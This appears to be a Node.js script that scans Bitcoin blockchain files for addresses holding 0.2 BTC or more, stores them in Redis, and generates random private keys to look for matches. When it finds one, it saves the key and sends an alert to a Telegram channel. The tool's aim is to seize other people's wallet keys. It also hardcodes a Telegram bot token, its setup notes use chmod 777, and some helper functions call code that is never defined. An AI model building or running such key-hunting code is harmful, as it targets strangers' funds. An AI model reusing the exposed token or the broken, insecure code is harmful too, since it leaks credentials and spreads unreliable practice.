"use strict";
/*
sudo apt-get update
sudo apt-get install software-properties-common
sudo apt-add-repository ppa:bitcoin/bitcoin
sudo apt-get update
sudo apt-get install bitcoind

bitcoind -datadir=/var/cff_server/wif/bitcoin/datadir -rpcport=14545 -rpcuser=test -rpcpassword=test -conf=/var/cff_server/wif/bitcoin/bitcoin.conf -deprecatedrpc=accounts -daemon

sudo apt update
sudo apt install redis-server

npm install fs -S
npm install bitcore-lib -S
npm install bitcoinjs-lib -S
npm install path -S
npm install colors -S
npm install request -S
npm install ws -S
npm install ioredis -S
*/
var fs = require('fs'),
	bitcore = require('bitcore-lib');
var Bitcoin = require('bitcoinjs-lib');
const path = require('path');
var colors = require('colors');
var request = require('request');
var Redis = require('ioredis');
var redis = new Redis(6379,'127.0.0.1');

/*********************** REDIS *******************************/
/*
sudo apt update
sudo apt install redis-server
sudo nano /etc/redis/redis.conf 
	#change work patch
	redis-cli
		config get dir
	sudo systemctl restart redis.service
	#if error 
		MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs for details about the error.
	redis-cli
		config get dir
	redis-cli
		CONFIG SET dir /var/cff_server/wif/redis
		CONFIG SET dbfilename dump.rdb
	#if error for save db
	nano /etc/systemd/system/redis.service
		#add in file
		ReadWriteDirectories=-/var/cff_server/wif/redis
	sudo systemctl daemon-reload
sudo systemctl status redis.service
sudo systemctl restart redis-server.service
	#Crear 
		#FLUSHDB - Removes data from your connection's CURRENT database.
		#FLUSHALL - Removes data from ALL databases.
	redis-cli 
		flushall
	#Get count stored values
	redis-cli 
		SCAN 0 COUNT 100 MATCH p_*
		#return
		1) "54788096"
		2) (empty list or set)
		(1.12s)
		
#Remove
sudo systemctl stop redis
sudo systemctl disable redis
sudo apt remove redis-server
sudo rm /etc/redis/redis.conf 
sudo rm -rf /var/lib/redis
sudo deluser redis

#Logs
tail -F /var/log/redis/redis-server.log

#Backup
sudo systemctl stop redis
ls -la /var/cff_server/wif/redis
sudo chown redis:redis /var/cff_server/wif/redis
sudo chown redis:redis /var/cff_server/wif/redis/dump.rdb
sudo chmod 777 /var/cff_server/wif/redis -R
sudo chmod 777 /var/cff_server/wif/redis/dump.rdb

cp -rf /var/cff_server/wif/redis/dump1.rdb /var/lib/redis/dump.rdb
ls -la /var/lib/redis/
sudo chown redis:redis /var/lib/redis/dump.rdb
sudo chmod 777 /var/lib/redis/dump.rdb
ls -la /var/lib/redis/
sudo systemctl restart redis
*/
try {
	redis.ping()
    .then(function(e) {
        console.log('Connected REDIS!');
    })
    .catch(function(e) {
            console.log('Error REDIS:'.red, e);
    });
	/*
	redis.set('test1', 'Tesla Model S', function (err, result) {
        console.log('Set Record: ', result);
    });
    redis.get('test1', function (err, result) {
        console.log('Get Record:', result);
    });
    redis.del('test1', function (err, result) {
        console.log('Delete Record:', result);
    });
    redis.get('test1', function (err, result) {
        console.log('Get Deleted Record:', result);
    });
	redis.quit();
	*/
}
catch (e) {
    console.log('Error REDIS:', e);
}

/***************************** BLOCK READER *******************************/

function readVarInt(stream) {
	var size = stream.read(1);
	var sizeInt = size.readUInt8();
	if (sizeInt < 253) {
		return size;
	}
	var add;
	if (sizeInt == 253) add = 2;
	if (sizeInt == 254) add = 4;
	if (sizeInt == 255) add = 8;
	if (add) {
		return Buffer.concat([size, stream.read(add)], 1 + add);
	}
	return -1;
}

function toInt(varInt) {
	if (!varInt) {
		return -1;
	}
	if (varInt[0] < 253) return varInt.readUInt8();
	switch(varInt[0]) {
		case 253: return varInt.readUIntLE(1, 2);
		case 254: return varInt.readUIntLE(1, 4);
		case 255: return varInt.readUIntLE(1, 8);
	}
}

function getRawTx(reader) {
	var txParts = [];
	txParts.push(reader.read(4)); //Version

	//Inputs
	var inputCount = readVarInt(reader);
	txParts.push(inputCount);
	for(var i = toInt(inputCount) - 1; i >= 0; i--) {
		txParts.push(reader.read(32)); //Previous tx
		txParts.push(reader.read(4)); //Index
		var scriptLength = readVarInt(reader);
		txParts.push(scriptLength);
		txParts.push(reader.read(toInt(scriptLength))); //Script Sig
		txParts.push(reader.read(4)); //Sequence Number
	}

	//Outputs
	var outputCount = readVarInt(reader);
	txParts.push(outputCount);
	for(i = toInt(outputCount) - 1; i >= 0; i--) {
		txParts.push(reader.read(8)); //Value
		var scriptLen = readVarInt(reader);
		txParts.push(scriptLen);
		txParts.push(reader.read(toInt(scriptLen))); //ScriptPubKey
	}
	txParts.push(reader.read(4)); //Lock time

	return Buffer.concat(txParts);
}

function bufferReader(buffer) {
	var index = 0;
	return {
		read: function read(bytes) {
			if (index + bytes > buffer.length) {
				return null;
			}
			var result = buffer.slice(index, index + bytes);
			index += bytes;
			return result;
		}
	}
}

function readHeader(reader) {
	var version = reader.read(4);
	if (version == null) {
		return null;
	}
	if (version.toString('hex') == 'f9beb4d9') {
		//It's actually the magic number of a different block (previous one was empty)
		reader.read(4); //block size
		return readHeader(reader);
	}
	return reader.read(76); //previous hash + merkle hash + time + bits + nonce
}

var fromBytesInt32=function(b) {
	if(b == null) return null;
    var result=0;
    for (let i=3;i>=0;i--) {
        result = (result << 8) | b[i];
    }
    return result;
};

var total = 0; 
var totalStore = 0; 
var okStore = 0; 
var noStore = 0; 
var txCount_ = 0;
var all = 0;
var time = Math.round(+new Date());
async function start_read_blocks(){
	for(var b = min_block; b < max_block; b++) {
		
		/*
		blk00201.dat	Nov 30, 2014 4:09:54 PM
		*/
		
		//var fileNumber = '01'+('000' + b).slice(-3),
		var fileNumber = ('0000' + b).slice(-5),
			data = fs.readFileSync( '/var/cff_server/wif/bitcoin/datadir/blocks/blk' + fileNumber + '.dat'),
			reader = bufferReader(data),
			magic = reader.read(4),
			blockSize = reader.read(4),
			blockHeader = readHeader(reader);
			
		var block_Size = fromBytesInt32(blockSize);
		//blk01508.dat
		console.log('blockSize:'.yellow, block_Size, 'File:', 'blk'+fileNumber+'.dat');
		
		while( blockHeader !== null ) {
			var txCount = toInt(readVarInt(reader));
			
			for(var j = 0; j < txCount; j++) {
				var rawTx = getRawTx(reader);
				var parsedTx = new bitcore.Transaction( rawTx );
				var trx = parsedTx.toObject();
				//var d = await store_address( trx.hash, 'hash', 0 );
				//if( d ){ okStore++; totalStore++; }else{ noStore++; totalStore++; }
				
				let tx = Bitcoin.Transaction.fromHex( rawTx );
				for (var inp = 0; inp < tx.ins.length; inp++) {
					let address;
					try {
						address = Bitcoin.address.fromOutputScript(tx.ins[inp].script);
					} catch (e) {}
					if ( address ){ 
						//console.log('input address'.green, address, tx.ins[inp].value);
						var d = await store_address( address, 'address', tx.ins[inp].value );
						if( d ){ okStore++; totalStore++; }else{ noStore++; totalStore++; }
						all++;
					}
				}
				for (var out = 0; out < tx.outs.length; out++) {
					let address;
					try {
						address = Bitcoin.address.fromOutputScript(tx.outs[out].script);
					} catch (e) {}
					if ( address ){ 
						//console.log('input address'.green, address, tx.outs[out].value);
						var d = await store_address( address, 'address', tx.outs[out].value );
						if( d ){ okStore++; totalStore++; }else{ noStore++; totalStore++; }
						all++;
					}
				}
				// if( j > 30){ return; }
			}
			
			magic = reader.read(4);
			blockSize = reader.read(4);
			blockHeader = readHeader(reader);
			
			var t = Math.round(+new Date());
			if( ( t - time)  > 5000 ){
				console.log( 'blk'+fileNumber+'.dat', 'Block:'.yellow, txCount_ + ' trx, Done:',total.toString().green, 'Tolal:', totalStore.toString().yellow, 'OK:', okStore.toString().green, 'NO:', noStore.toString().red, 'P/S:'.bold.blue, all );
				time = t;
				txCount_ = 0;
				okStore = 0;
				noStore = 0;
				all = 0;
			}else{
				txCount_ = txCount_ + txCount;
			}
			
			total = total + txCount;
		}
	}
	return true;
}

/***********************************************************************/
// Bitcoin 700 blocks 78mln address
var min_block = 1;
var max_block = 1400;
var min_satosh = 20000000;//0.20000000 BTC

var keysGoodFile = './goodKeys.json';
var arrGoodKeys = [];

fs.readFile( path.resolve(__dirname, keysGoodFile ), 'utf-8', function(err, buf) {
	var arr = buf.toString();
	arrGoodKeys = JSON.parse( arr );
	console.log('loadGoodKeys'.green, arrGoodKeys.length);
	start_read_blocks();
});

function storeGoodKeys( ){
	fs.writeFileSync( path.resolve(__dirname, keysGoodFile ), JSON.stringify( arrGoodKeys, null, 4));
	console.log('storeGoodKeys'.green);
}

var sets = '';
function rng () {
	return Bitcoin.crypto.sha256(Buffer.from( sets ));
}

function store_address( source, type, amount ){
	return new Promise(resolve => {
		if( parseInt( amount ) < parseInt( min_satosh ) && type != 'hash' && type != 'mrklRoot' ){ 
			return resolve( false ); 
		}
		if( typeof source == 'string' ){
			if( typeof amount != 'string' && typeof amount != 'number' ){ amount = 0; }
			
			//make privateKey and get address
			sets = source;
			const keyPair = Bitcoin.ECPair.makeRandom( /*{ rng : rng }*/ );
			const { address } = Bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey });
			//console.log("address ", address);
			var WIFkey = keyPair.toWIF();
			//console.log("private key WIF ", WIFkey);
			var res = 'WIFkey: '+WIFkey+' '+type.toUpperCase()+': '+source;
			sets = '';
			//try found WIF address on exist
			//var find = arrKeys.filter(x => x.source === address);
			var arrWIF = { address:address, WIFkey:WIFkey, amount:amount, source:source, type:type };
			
			redis.get( address , function (err, result) {
				if( result != null ){
					console.log( 'Find WIF to ', arrWIF );
					tg_notify( 'Find WIF to '+address );
					arrGoodKeys.push( arrWIF );
					storeGoodKeys( );
				}
				redis.set( source , amount, function (err, result) {
					return resolve( true );
				});
			});
			
			/*
			redis.get( source , function (err, result) {
				if( result == null ){
					request.get( 'https://blockchain.info/q/addressbalance/'+source, { },
					function (error, res, body) {
						if (!error && res.statusCode == 200){
							if( res.body > 100000 ){
								redis.set( source , res.body , function (err, result) {
									console.log( 'address:', source.toString().yellow, 'BTC'.bold.blue, res.body );
									return resolve( true );
								});
							}else{
								return resolve( false );
							}
							*/
							/*
							try{
								var headers = { 
								   'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.110 Safari/537.36',
								   'Content-Type' : 'application/x-www-form-urlencoded' 
								};
								request.post( {headers: headers, url: 'https://api.omniwallet.org/v1/address/addr/', form: { addr:address }, method: 'POST'},
								function (error, res, body) {
									if (!error && res.statusCode == 200){
										try{
											var balance = JSON.parse( res.body );
											balance = balance.balance;
											for( var i = 0; i < balance.length; i++) {
												if( balance[i].value > 100000 ){
													redis.set( address , balance[i].value, function (err, result) {
														console.log( 'address:', address.toString().yellow, 'OMNI_'+balance[i].symbol.toString().toUpperCase().bold.blue, balance[i].value );
													});
												}
											}
											return resolve( true );
										}catch(e){
											return resolve( false );
										}
									}else{
										return resolve( false );
									}
								});
							}catch(e){
								return resolve( false );
							}
							*/
						/*}else{*/
							/*
							try{
								var headers = { 
								   'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.110 Safari/537.36',
								   'Content-Type' : 'application/x-www-form-urlencoded' 
								};
								request.post( {headers: headers, url: 'https://api.omniwallet.org/v1/address/addr/', form: { addr:address }, method: 'POST'},
								function (error, res, body) {
									if (!error && res.statusCode == 200){
										try{
											var balance = JSON.parse( res.body );
											balance = balance.balance;
											for( var i = 0; i < balance.length; i++) {
												if( balance[i].value > 100000 ){
													redis.set( address , balance[i].value, function (err, result) {
														console.log( 'address:', address.toString().yellow, 'OMNI_'+balance[i].symbol.toString().toUpperCase().bold.blue, balance[i].value );
													});
												}
											}
											return resolve( true );
										}catch(e){
											return resolve( false );
										}
									}else{
										return resolve( false );
									}
								});
							}catch(e){
								return resolve( false );
							}
							*/
						/*	return resolve( false );
						}
					});
				}else{
					return resolve( true );
				}
			});*/
		}else{
			return resolve( false );
		}
	});
}

/*********************** CHECK ONLINE BALANCE ****************/

function check_omni( address ){
	return new Promise(resolve => {
		try{
			var headers = { 
			   'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.110 Safari/537.36',
			   'Content-Type' : 'application/x-www-form-urlencoded' 
			};
			request.post( {headers: headers, url: 'https://api.omniwallet.org/v1/address/addr/', form: { addr:address }, method: 'POST'},
			function (error, res, body) {
				if (!error && res.statusCode == 200){
					try{
						var balance = JSON.parse( res.body );
						balance = balance.balance;
						for( var i = 0; i < balance.length; i++) {
							if( balance[i].value > 100000 ){
								redis.set( address , balance[i].value, function (err, result) {
									console.log( 'address:', address.toString().yellow, balance[i].symbol.toString().toUpperCase().bold.blue, balance[i].value );
								});
							}
						}
						return resolve( true );
					}catch(e){
						return resolve( false );
					}
				}else{
					return resolve( false );
				}
			});
		}catch(e){
			return resolve( false );
		}
	});
}

function checkKeys( address, privKey, type, source, name ){ 
	return new Promise(resolve => {
		try{
			/*
			getreceivedbyaddress addressbalance
			*/
			request.get(
			'https://blockchain.info/q/'+type+'/'+address,
			{
				/*
				json: {
					"json": true
				}
				*/				
			},
			function (error, res, body) {
				if (!error && res.statusCode == 200){
					console.log('checkKeys'.yellow, address, type, res.body.toString().bgGreen.white.bold);
					if( res.body > 0 ){
						if( type == 'addressbalance' ){
							console.log('checkKeys'.green, address+' / '+privKey+' : '+res.body.toString().bgGreen.white.bold );
							arrKeys.push( { address:address, privKey:privKey, microBtc:res.body, source:source, name:name } );
							storeKeys( );
						}
						return resolve( true );
					}else{
						return resolve( false );
					}
				}else{
					console.log('checkKeys'.red);
					return resolve( false );
				}
			});
		}catch(e){ return resolve( false ); }
	});
}

/*********************** NOTIFY ******************************/

function tg_notify( message, repeat ){
	try{
		var chatId = '@WIFrobots'; var token = '703397220:AAG-C-XyeCfS_GqENzrEmZlaKdD6cKsdvfI';
		/*
		WIFrobot
		@ForecastCOFFE_bot
		703397220:AAG-C-XyeCfS_GqENzrEmZlaKdD6cKsdvfI
		*/
		var mess = message.toString();
		var headers = { 
		   'Content-Type': 'application/json' 
		};
		var url = 'https://api.telegram.org/bot'+token+'/sendMessage';
		request.post( 
			{
				headers: headers, 
				//proxy: 'http://95.164.74.27:32231',
				url: url,
				method: 'POST',
				formData : {
					chat_id: chatId,
					text: mess
				}
			} ,
		function (err, response) {
			if (err) {
				console.log( 'tg_notify', 'BAD'.red, err );
				if( typeof repeat !== 'boolean' ){
					tg_notify( message, true );
				}else if( typeof repeat === 'boolean' && repeat === true ){
					console.log( 'tg_notify', 'BAD'.red, repeat );
					return;
				}
			}
			try{
				if( response.body ){
					console.log( 'tg_notify', 'OK'.green, repeat );
				}else{
					if( typeof repeat !== 'boolean' ){
						tg_notify( message, true );
					}else if( typeof repeat === 'boolean' && repeat === true ){
						console.log( 'tg_notify', 'BAD'.red, repeat );
						return;
					}
				}
			}catch(e){
				if( typeof repeat !== 'boolean' ){
					tg_notify( message, true );
				}else if( typeof repeat === 'boolean' && repeat === true ){
					console.log( 'tg_notify', 'BAD'.red, repeat );
					return;
				}
			}
		});
	}catch(e){
		console.log('tg_notify EXCEPTION'.red, e);
		if( typeof repeat !== 'boolean' ){
			tg_notify( message, true );
		}else if( typeof repeat === 'boolean' && repeat === true ){
			console.log( 'tg_notify', 'BAD'.red, repeat );
			return;
		}	
	}
}